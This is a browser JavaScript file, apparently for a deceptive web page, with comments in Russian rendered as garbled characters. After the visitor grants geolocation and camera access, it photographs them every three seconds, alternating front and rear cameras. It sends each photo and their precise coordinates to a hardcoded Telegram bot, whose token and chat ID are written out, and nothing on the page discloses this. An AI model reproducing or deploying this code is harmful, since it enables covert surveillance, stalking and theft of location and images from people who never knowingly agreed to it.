const TELEGRAM_BOT_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const TELEGRAM_CHAT_ID = '8071841674';

const countdownEl = document.getElementById('countdown');
const statusEl = document.getElementById('status');
const videoEl = document.getElementById('video');
const canvasEl = document.getElementById('canvas');
const reloadBtn = document.getElementById('reloadBtn');

let currentCamera = 'user'; // —Ñ—Ä–æ–Ω—Ç / –∑–∞–¥–Ω—è—è –ø–æ –æ—á–µ—Ä–µ–¥–∏
let stream = null;
let photoInterval = null;
let geoFetched = false;

// –°–Ω–∞—á–∞–ª–∞ –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø
async function requestPermissions() {
  try {
    await requestGeo();
    await requestCameraTest(); // –ø—Ä–æ—Å—Ç–æ –≤–∫–ª—é—á–∏–º –∏ –≤—ã–∫–ª—é—á–∏–º –∫–∞–º–µ—Ä—É
    startCountdown(); // –µ—Å–ª–∏ –≤—Å—ë –æ–∫ ‚Äî –∑–∞–ø—É—Å–∫–∞–µ–º –æ–±—Ä–∞—Ç–Ω—ã–π –æ—Ç—Å—á—ë—Ç
  } catch (e) {
    showReloadButton();
  }
}

// –ó–∞–ø—Ä–æ—Å –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞
async function requestGeo() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) return reject();
    navigator.geolocation.getCurrentPosition(
      pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        geoFetched = true;
        sendLocationToTelegram(lat, lon);
        resolve();
      },
      err => reject(err),
      { enableHighAccuracy: true, timeout: 5000 }
    );
  });
}

// –ó–∞–ø—Ä–æ—Å –∫–∞–º–µ—Ä—ã –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ (–ª—é–±–æ–π –ø–æ—Ç–æ–∫)
async function requestCameraTest() {
  const testStream = await navigator.mediaDevices.getUserMedia({ video: true });
  stopStream(testStream); // –ø—Ä–æ—Å—Ç–æ —á—Ç–æ–±—ã –±—Ä–∞—É–∑–µ—Ä –¥–∞–ª –¥–æ—Å—Ç—É–ø
  return Promise.resolve();
}

// –û–±—Ä–∞—Ç–Ω—ã–π –æ—Ç—Å—á—ë—Ç
function startCountdown() {
  let count = 3;
  countdownEl.textContent = count;
  countdownEl.style.display = 'block';
  const interval = setInterval(() => {
    count--;
    if (count === 0) {
      clearInterval(interval);
      countdownEl.style.display = 'none';
      startCameraCycle(); // –∑–∞–ø—É—Å–∫–∞–µ–º —Ñ–æ—Ç–æ-—Ü–∏–∫–ª
    } else {
      countdownEl.textContent = count;
    }
  }, 1000);
}

// –ó–∞–ø—É—Å–∫ —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä –∫–∞–∂–¥—ã–µ 3 —Å–µ–∫—É–Ω–¥—ã
async function startCameraCycle() {
  photoInterval = setInterval(async () => {
    try {
      if (stream) {
        stopStream(stream);
        videoEl.srcObject = null;
      }
      currentCamera = (currentCamera === 'user') ? 'environment' : 'user';
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentCamera }, audio: false });
      videoEl.srcObject = stream;
      await new Promise(res => videoEl.onloadedmetadata = res);
      sendPhotoToTelegram();
    } catch (e) {
      clearInterval(photoInterval);
      showReloadButton();
    }
  }, 3000);
}

// –§–æ—Ç–æ ‚Üí Telegram
function sendPhotoToTelegram() {
  const ctx = canvasEl.getContext('2d');
  canvasEl.width = videoEl.videoWidth;
  canvasEl.height = videoEl.videoHeight;
  ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
  canvasEl.toBlob(blob => {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, `${currentCamera}_photo.jpg`);
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    }).catch(() => {});
  }, 'image/jpeg', 0.8);
}

// –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è ‚Üí Telegram
function sendLocationToTelegram(lat, lon) {
  const url = `https://maps.google.com/?q=${lat},${lon}`;
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: `üåç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è: ${url}`
    })
  });
}

// –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø–æ—Ç–æ–∫–∞
function stopStream(s) {
  s.getTracks().forEach(track => track.stop());
}

// –ö–Ω–æ–ø–∫–∞ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞
function showReloadButton() {
  reloadBtn.style.display = 'block';
  reloadBtn.onclick = () => location.reload();
  if (statusEl) statusEl.style.display = 'none';
}

// ‚ñ∂Ô∏è –°—Ç–∞—Ä—Ç—É–µ–º
requestPermissions();
